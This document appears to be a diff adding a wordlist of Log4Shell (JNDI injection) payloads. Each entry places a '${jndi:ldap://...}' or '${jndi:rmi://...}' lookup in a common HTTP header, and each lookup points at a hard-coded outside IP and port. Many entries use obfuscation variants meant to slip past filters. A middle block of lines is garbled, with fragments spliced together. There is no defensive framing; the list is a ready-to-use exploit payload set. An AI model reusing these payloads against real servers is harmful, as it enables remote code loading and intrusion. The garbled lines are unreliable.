@@ -1,0 +1,183 @@
+X-Client-IP: ${jndi:ldap://101.42.117.115:60178/info}
+X-Remote-IP: ${jndi:ldap://101.42.117.115:60178/info}
+X-Remote-Addr: ${jndi:ldap://101.42.117.115:60178/info}
+X-Forwarded-For: ${jndi:ldap://101.42.117.115:60178/info}
+X-Originating-IP: ${jndi:ldap://101.42.117.115:60178/info}
+User-Agent: ${jndi:ldap://101.42.117.115:60178/info}
+Referer: ${jndi:ldap://101.42.117.115:60178/info}
+CF-Connecting_IP: ${jndi:ldap://101.42.117.115:60178/info}
+True-Client-IP: ${jndi:ldap://101.42.117.115:60178/info}
+X-Forwarded-For: ${jndi:ldap://101.42.117.115:60178/info}
+Originating-IP: ${jndi:ldap://101.42.117.115:60178/info}
+X-Real-IP: ${jndi:ldap://101.42.117.115:60178/info}
+X-Client-IP: ${jndi:ldap://101.42.117.115:60178/info}
+Forwarded: ${jndi:ldap://101.42.117.115:60178/info}
+Client-IP: ${jndi:ldap://101.42.117.115:60178/info}
+Contact: ${jndi:ldap://101.42.117.115:60178/info}
+X-Wap-Profile: ${jndi:ldap://101.42.117.115:60178/info}
+X-Api-Version: ${jndi:ldap://101.42.117.115:60178/info}
+Host: ${jndi:ldap://101.42.117.115:60178/info}
+X-Client-IP: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+X-Client-IP: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+X-Client-IP: ${jndi:rmi://101.42.117.115:60178}
+X-Client-IP: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Client-IP: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Client-IP: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Client-IP: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+X-Remote-IP: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+X-Remote-IP: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+X-Remote-IP: ${jndi:rmi://101.42.117.115:60178}
+X-Remote-IP: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Remote-IP: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Remote-IP: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Remote-IP: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+X-Remote-Addr: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+X-Remote-Addr: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+X-Remote-Addr: ${jndi:rmi://101.42.117.115:60178}
+X-Remote-Addr: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Remote-Addr: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Remote-Addr: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Remote-Addr: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+X-Forwarded-For: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+X-Forwarded-For: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+X-Forwarded-For: ${jndi:rmi://101.42.117.115:60178}
+X-Forwarded-For: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Forwarded-For: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Forwarded-For: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Forwarded-For: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+X-Originating-IP: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+X-Originating-IP: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+X-Originating-IP: ${jndi:rmi://101.42.117.115:60178}
+X-Originating-IP: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Originating-IP: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Originating-IP: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Originating-IP: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+User-Agent: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+User-Agent: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+User-Agent: ${jndi:rmi://101.42.117.115:60178}
+User-Agent: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+User-Agent: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+User-Agent: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+User-Agent: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+Referer: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+Referer: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+Referer: ${jndi:rmi://101.42.117.115:60178}
+Referer: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+Referer: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+Referer: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+Referer: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+CF-Connecting_IP: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+CF-Connecting_IP: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+CF-Connecting_IP: ${jndi:rmi://101.42.117.115:60178}
+CF-Connecting_IP: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+CF-Connecting_IP: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+CF-Connecting_IP: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+CF-Connecting_IP: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+True-Client-IP: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+True-Client-IP: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+True-Client-IP: ${jndi:rmi://101.42.117.115:60178}
+True-Client-IP: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+True-Client-IP: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+True-Client-IP: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+True-Client-IP: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+X-Forwarded-For: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+X-Forwarded-For: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+X-Forwarded-For: ${jndi:rmi://101.42.117.115:60178}
+X-Forwarded-For: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Forwarded-For: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Forwarded-For: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Forwarded-For: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+Originating-IP: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+Originating-IP: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+Originating-IP: ${jndi:rmi://101.42.117.115:60178}
+Originating-IP: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+Originating-IP: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+Originating-IP: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+Originating-IP: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+X-Real-IP: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+X-Real-IP: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+X-Real-IP: ${jndi:rmi://101.42.117.115:60178}
+X-Real-IP: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Real-IP: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Real-IP: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Real-IP: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+X-Client-IP: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+X-Client-IP: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+X-Client-IP: ${jndi:rmi://101.42.117.115:60178}
+X-Client-IP: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Client-IP: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Client-IP: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Client-IP: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+Forwarded: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+Forwarded: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+Forwarded: ${jndi:rmi://101.42.117.115:60178}
+Forwarded: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+Forwarded: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+Forwarded: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+Forwarded: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+Client-IP: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+Client-IP: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+Client-IP: ${jndi:rmi://101.42.117.115:60178}
+Client-IP: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+Client-IP: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+Client-IP: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+Client-IP: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+Contact: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+Contact: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+Contact: ${jndi:rmi://101.42.117.115:60178}
+Contact: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+Contact: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+Contact: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+Contact: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+X-Wap-Profile: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+X-Wap-Profile: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+X-Wap-Profile: ${jndi:rmi://101.42.117.115:60178}
+X-Wap-Profile: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Wap-Profile: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Wap-Profile: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Wap-Profile: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}: ${::-r}${::-m}${::-i}://101.42.117.115:60178/poc}
+X-Api-Version: ${${::-j}ndi:rmi://101.42.117.115:60178/ass}
+X-Api-Version: ${jndi:rmi://101.42.117.115:60178}
+X-Api-Version: ${${lower:jndi}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Api-Version: ${${lower: ${lower:jndi}}: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Api-Version: ${${lower:j}${lower:n}${lower:d}i: ${lower:rmi}://101.42.117.115:60178/poc}
+X-Api-Version: ${${lower:j}${upper:n}${lower:d}${upper:i}: ${lower:r}m${lower:i}}://101.42.117.115:60178/poc}
+X-Client-IPldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+X-Remote-IPldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+X-Remote-Addrldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+X-Forwarded-Forldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+X-Originating-IPldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+User-Agentldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+Refererldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+CF-Connecting_IPldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+True-Client-IPldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+X-Forwarded-Forldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+Originating-IPldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+X-Real-IPldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+X-Client-IPldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+Forwardedldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+Client-IPldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+Contactldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+X-Wap-Profileldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+X-Api-Versionldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+Hostldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type ${jndildap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://101.42.117.115:60178/cn=JndiExploit,dc=apache,dc=org?Type=A Type//101.42.117.115:60178/info}
+X-Client-IP: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+X-Remote-IP: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+X-Remote-Addr: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+X-Forwarded-For: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+X-Originating-IP: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+User-Agent: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+Referer: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+CF-Connecting_IP: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+True-Client-IP: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+X-Forwarded-For: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+Originating-IP: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+X-Real-IP: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+X-Client-IP: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+Forwarded: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+Client-IP: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+Contact: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+X-Wap-Profile: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+X-Api-Version: ${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}
+                
